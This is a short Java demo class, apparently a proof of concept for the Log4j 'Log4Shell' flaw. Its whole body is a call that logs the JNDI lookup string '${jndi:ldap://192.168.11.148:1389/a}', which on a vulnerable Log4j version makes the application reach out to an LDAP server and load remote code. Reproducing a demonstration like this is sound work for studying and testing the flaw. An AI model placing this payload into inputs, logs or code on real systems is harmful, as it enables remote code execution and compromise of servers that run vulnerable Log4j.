package com.leon.log4j;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * log4j bug demo
 */
public class Log4jBug {
    private static final Logger logger = LogManager.getLogger(Log4jBug.class);

    public static void main(String[] args) {
        logger.error("${jndi:ldap://192.168.11.148:1389/a}");
    }
}
